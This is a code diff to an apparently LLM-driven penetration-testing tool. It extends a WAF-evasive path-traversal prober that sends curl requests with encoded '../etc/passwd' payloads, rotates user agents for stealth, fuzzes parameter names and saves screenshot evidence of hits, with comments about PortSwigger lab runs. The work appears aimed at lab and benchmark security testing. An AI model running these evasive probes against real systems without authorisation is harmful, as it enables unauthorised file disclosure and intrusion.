@@ -1,13 +1,51 @@
+import logging
 import random
+import re
 import time
+from urllib.parse import parse_qsl, urlsplit, urlunsplit
 
 from app.tools.utils import normalize_domain_for_memory, SENSITIVE_CONTENT_INDICATORS
 from app.tools.payloads import fetch_intruder_payloads
+from app.tools.vuln_report_writer import VulnerabilityReportWriter
+
+logger = logging.getLogger(__name__)
+
+# Live-discovered 2026-07-25: a real run against a PortSwigger lab called
+# Advanced_Evasion_Probe with tool_input
+# "https://<lab>.web-security-academy.net/ path traversal" - the model
+# appended descriptive free text after the URL (a real, observed behavior,
+# not a contrived edge case - Exploit_Suggester's own prior output primes
+# the model toward this style). Left un-sanitized, `advanced_vuln_probe`
+# spliced this whole string straight into a curl command, producing a
+# broken URL (an embedded literal space, then garbage appended after it)
+# that was guaranteed to fail against ANY target regardless of whether it
+# was actually vulnerable. Extract just the first http(s):// token -
+# trailing descriptive text is dropped rather than corrupting the request.
+_URL_TOKEN_RE = re.compile(r"https?://\S+", re.IGNORECASE)
+
+
+def _extract_clean_url(raw: str) -> str:
+    """Pull a bare URL out of a tool_input string that may carry trailing
+    free text appended by the model (see `_URL_TOKEN_RE`'s comment above).
+
+    Args:
+        raw (str): The raw `url` argument as received by
+            `advanced_vuln_probe`/`stealth_run` callers.
+
+    Returns:
+        str: The first `http(s)://`-prefixed, whitespace-free token found
+        in `raw`, or `raw.strip()` unchanged if no such token is present
+        (e.g. a bare domain with no scheme - left as-is, not this
+        function's concern).
+    """
+    match = _URL_TOKEN_RE.search(raw or "")
+    return match.group(0) if match else (raw or "").strip()
+
 
 class EvasionService:
     """Performs targeted, WAF-evasive probes for SQLi and Path Traversal."""
 
-    def __init__(self, runner, memory):
+    def __init__(self, runner, memory, browser_manager=None):
         """Set up the probe with its command runner, memory sink, and a
         pool of user-agent strings to rotate through for stealth headers.
 
@@ -16,9 +54,16 @@ class EvasionService:
                 (shared CommandRunner).
             memory: ArgusMemory-like object with an `add_finding(...)`
                 method, used to record confirmed findings.
+            browser_manager (BrowserManager, optional): specs/029 - when
+                supplied, a confirmed path-traversal hit gets an automatic
+                screenshot captured as proof-of-concept evidence. `None`
+                (the default) leaves every pre-existing behavior, call
+                signature, and test in `tests/test_tools/test_evasion.py`
+                unchanged - screenshot capture is strictly additive.
         """
         self.runner = runner
         self.memory = memory
+        self.browser_manager = browser_manager
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.98 Safari/537.36",
@@ -80,22 +125,60 @@ class EvasionService:
         before this runs.
 
         Args:
-            url (str): Target URL to probe (a `?item=`/`?id=` query
-                parameter is appended per payload).
+            url (str): Target URL to probe. Any trailing free text the
+                model appended (e.g. "<url> path traversal") is stripped
+                via `_extract_clean_url` before use. If `url` already
+                carries a query string (e.g. a crawled
+                "?filename=x.jpg"), that parameter's name is reused for
+                every payload instead of a guessed one; otherwise a short
+                list of common real-world parameter names is tried per
+                payload (`item`, `file`, `filename`, `path`, `document`) -
+                see the inline comment below for why `item` alone isn't
+                enough.
 
         Returns:
             str: A formatted report of confirmed findings, or
             "No vulnerabilities detected with advanced evasion probes." if
             none of the traversal/SQLi payloads produced a signal.
         """
+        url = _extract_clean_url(url)
         print(f"[*] [Argus-Core] Starting Advanced Evasion Probes for: {url}")
         results = []
+        screenshot_evidence = []
         clean_target = normalize_domain_for_memory(url)
 
         # 1. Path Traversal Evasion
         # --max-time/--connect-timeout let curl itself enforce the bound
         # (more reliable than only relying on the outer process being
         # killed - see command_runner.py's own timeout handling).
+        parsed = urlsplit(url)
+        existing_params = parse_qsl(parsed.query, keep_blank_values=True)
+        base_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
+        if existing_params:
+            # A parameter name the model/recon already discovered on this
+            # exact endpoint is a far stronger signal than any guess -
+            # reuse it instead of the synthetic candidate list below.
+            param_candidates = [existing_params[-1][0]]
+        else:
+            # "item" stays first for exact backward compatibility with
+            # every pre-existing call site/test that passes a bare URL.
+            # The rest is a live, evidence-backed addition (2026-07-25):
+            # this project's own specs/025 benchmark fixture
+            # (path_traversal_download) uses "?file=", not "?item=", and
+            # scored 0% on its "traverse_to_secret_file"/"retrieve_flag"
+            # subtasks in EVERY recorded benchmark run because of exactly
+            # this mismatch - confirmed by directly testing this method
+            # against the fixture's real server. A live PortSwigger run
+            # the same day hit the same class of gap. Kept to 5 names:
+            # each additional candidate multiplies the live requests per
+            # payload, and EvasionService is already the slowest tool in a
+            # run (stealth_run's per-call delay).
+            param_candidates = ["item", "file", "filename", "path", "document"]
+        # Locked in the first time any candidate confirms a hit - once the
+        # real parameter name is known, stop re-fuzzing it for every
+        # subsequent payload.
+        confirmed_param = None
+
         traversal_payloads = [
             "../../../../etc/passwd",
             "..%2f..%2f..%2f..%2fetc%2fpasswd",
@@ -112,12 +195,45 @@ class EvasionService:
             if p not in traversal_payloads
         ]
         for p in traversal_payloads:
-            cmd = f"curl -s --max-time 15 --connect-timeout 5 '{url}?item={p}'"
-            body = self.stealth_run(cmd)
-            for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
-                if indicator in body:
-                    results.append(f"[!] Path Traversal Success ({p}): {summary}")
-                    self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"Traversal: {p}", summary)
+            for param_name in ([confirmed_param] if confirmed_param else param_candidates):
+                probe_url = f"{base_url}?{param_name}={p}"
+                cmd = f"curl -s --max-time 15 --connect-timeout 5 '{probe_url}'"
+                body = self.stealth_run(cmd)
+                hit = False
+                for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
+                    if indicator in body:
+                        confirmed_param = param_name
+                        results.append(f"[!] Path Traversal Success ({p}): {summary}")
+                        self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"Traversal: {p}", summary)
+                        # specs/029: capture proof-of-concept evidence for this
+                        # confirmed hit. Best-effort only - a screenshot failure
+                        # (browser crash, Playwright not installed, etc.) must
+                        # never take down an already-confirmed, already-recorded
+                        # finding, so any exception here is caught and logged,
+                        # never re-raised.
+                        if self.browser_manager is not None:
+                            try:
+                                evidence = self.browser_manager.capture_vulnerability(
+                                    "path_traversal", probe_url, payload=p, note=summary,
+                                )
+                                screenshot_evidence.append(evidence)
+                                results.append(f"    [camera] Screenshot saved: {evidence['screenshot_path']}")
+                            except Exception as e:
+                                # Surfaced in BOTH the returned text (so it's
+                                # visible wherever this tool's output is shown -
+                                # GUI report tab, CLI stdout, agent trace) and the
+                                # logger (structured logs) - a silent
+                                # logger.warning() alone was easy to miss
+                                # entirely depending on the caller's logging
+                                # config, which made a broken Playwright install
+                                # look identical to "no report because nothing
+                                # was actually vulnerable."
+                                print(f"[!] [Argus-Core] Screenshot capture failed for payload '{p}': {e}")
+                                logger.warning("Screenshot capture failed for payload %s: %s", p, e)
+                                results.append(f"    [!] Screenshot capture FAILED ({p}): {e}")
+                        hit = True
+                        break
+                if hit:
                     break
 
         # 2. SQLi WAF Evasion
@@ -147,4 +263,14 @@ class EvasionService:
         if not results:
             return "No vulnerabilities detected with advanced evasion probes."
 
-        return "--- [SHIELD] ADVANCED EVASION PROBE REPORT ---\n" + "\n".join(results)
+        report_line = ""
+        if screenshot_evidence:
+            try:
+                report_path = VulnerabilityReportWriter().save_report(
+                    clean_target, "path_traversal", screenshot_evidence,
+                )
+                report_line = f"\n[report] Vulnerability evidence report: {report_path}"
+            except Exception as e:
+                logger.warning("Failed to write vulnerability evidence report: %s", e)
+
+        return "--- [SHIELD] ADVANCED EVASION PROBE REPORT ---\n" + "\n".join(results) + report_line
